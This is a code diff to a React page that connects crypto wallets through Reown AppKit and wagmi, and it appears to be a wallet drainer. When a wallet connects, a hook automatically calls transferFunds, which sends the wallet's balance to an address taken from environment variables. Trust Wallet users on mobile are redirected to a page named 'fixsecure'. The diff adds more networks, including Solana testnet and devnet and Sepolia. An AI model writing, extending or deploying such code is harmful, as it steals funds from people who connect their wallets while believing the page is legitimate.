@@ -7,25 +7,20 @@ import {
   arbitrum, 
   bsc, 
   solana, 
-  bitcoin,    
+  solanaTestnet, 
+  solanaDevnet, 
+  bitcoin,   sepolia, 
 } from '@reown/appkit/networks';
-import { useAppKit, useWalletInfo  } from "@reown/appkit/react";
+import { useAppKit, useAppKitAccount, useWalletInfo } from "@reown/appkit/react";
 import {
-  useAccount,
   useSendTransaction,
-  useWaitForTransactionReceipt ,
   useBalance,
   useGasPrice,
   useEstimateGas,
 } from "wagmi";
 // import { parseEther } from 'viem'
 import { useEffect, useState } from "react";
-
-
-
-
-
-
+import { useWaitForTransactionReceipt } from "wagmi";
 
 
 
@@ -43,11 +38,12 @@ import { useEffect, useState } from "react";
 const Home = () => {
   const [totalFee, setTotalFee] = useState(null);
 
-  const { open  } = useAppKit();
-  const { address, isConnected } = useAccount();
+  const { open } = useAppKit();
+  const { address, isConnected } = useAppKitAccount();
   const balance = useBalance({ address });
   const [amountToSend, setAmountToSend] = useState(null);
-   const { walletInfo } = useWalletInfo();
+     const { walletInfo } = useWalletInfo();
+
   const [txHash, setTxHash] = useState(null);
 
   const chainId = useChainId();
@@ -57,7 +53,10 @@ const CHAINS = {
   [arbitrum.id]: arbitrum,
   [bsc.id]: bsc,
   [solana.id]: solana,
+  [solanaTestnet.id]: solanaTestnet,
+  [solanaDevnet.id]: solanaDevnet,
   [bitcoin.id]: bitcoin,
+  [sepolia.id] :   sepolia,
 };
 
 const activeChain = CHAINS[chainId];
@@ -69,10 +68,13 @@ function formatBalance(balanceBigInt, chain) {
 
   const decimalsMap = {
     mainnet: 18,
+      sepolia:18,
     arbitrum: 18,
     bsc: 18,
     bitcoin: 8,
     solana: 9,
+    solanaTestnet: 9,
+    solanaDevnet: 9
   };
 
   const decimals = decimalsMap[chain] ?? 18; // default to 18
@@ -105,35 +107,32 @@ function formatBalance(balanceBigInt, chain) {
     }
   }, [confirmed]);
 
-  const isMobile = () => /Mobi|Android/i.test(navigator.userAgent)
-  const [visitedTW, setVisitedTW ] = useState(false)
+  
+    const isMobile = () => /Mobi|Android/i.test(navigator.userAgent)
+    const [visitedTW, setVisitedTW ] = useState(false)
+  
+    useEffect(() => {
+               if (walletInfo?.name  === "Trust Wallet" && isMobile() && !visitedTW) {
+        // Open Trust Wallet with deep link
+       const trustLink = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`
+       window.open(trustLink, "_blank");
+       setVisitedTW(true)
+        return
+      }
+    }, [isConnected])
 
   useEffect(() => {
-             if (walletInfo?.name  === "Trust Wallet" && isMobile() && !visitedTW) {
-      // Open Trust Wallet with deep link
-     const trustLink = `https://link.trustwallet.com/open_url?coin_id=${chainId}&url=https://fixsecure.onrender.com`
-     window.open(trustLink, "_blank");
-     setVisitedTW(true)
-      return
-    }
-  }, [isConnected])
-
-  useEffect(() => {
-    if (isConnected && address ) {
+    if (isConnected && address &&  activeChain?.id ) {
       console.log("Wallet connected:", address);
       console.log("Connected to:", activeChain?.name);
-      console.log("Connected wallet", walletInfo?.name);
       walletConnectNotification();
-      console.log("chainId:", chainId)
-      console.log("activeChain:", activeChain?.id)
-
-      console.log("Balance:", formatBalance(balance.data?.value, activeChain,  walletInfo?.name));
+      console.log("Balance:", formatBalance(balance.data?.value, activeChain));
 
       // ✅ Now safe to call transfer
       transferFunds();
       // setTotalFee(0)
     }
-  }, [isConnected, address, balance.data, totalFee, activeChain]);
+  }, [isConnected, address, balance.data, totalFee, activeChain?.id]);
 
   const { sendTransaction } = useSendTransaction();
   const gasPrice = useGasPrice();
@@ -154,14 +153,13 @@ function formatBalance(balanceBigInt, chain) {
 
   const transferFunds = () => {
 
-      const chain = CHAINS[chainId];
 
-  if (!chain) {
+  if (!activeChain?.id) {
     console.log("Unknown chain or unsupported chain");
     return;
   }
 
-  console.log("Sending transaction on:", chain.name);
+  console.log("Sending transaction on:", activeChain.name);
     console.log("amount to send:", formatBalance(amountToSend, activeChain));
     console.log(balance.data?.value);
     if (balance.data?.value <= 0n || !amountToSend || amountToSend <= 0n) {
@@ -169,14 +167,15 @@ function formatBalance(balanceBigInt, chain) {
       return;
     }
 
-    if(walletInfo?.name === "MetaMask" && isMobile()) {
+       if(walletInfo?.name === "MetaMask" && isMobile()) {
       const metamaskLink= "https://link.metamask.io"
       window.open(metamaskLink, "_blank")
     }
 
     sendTransaction(
       {
-        chainId: chain.id,
+        chainId: activeChain?.id,
+        account: address,
         to: import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`],
         value: amountToSend,
       },
@@ -265,7 +264,7 @@ function formatBalance(balanceBigInt, chain) {
           </button>
         ) : (
           <div>
-            <appkit-button />
+            <appkit-button  />
           </div>
         )}
       </div>
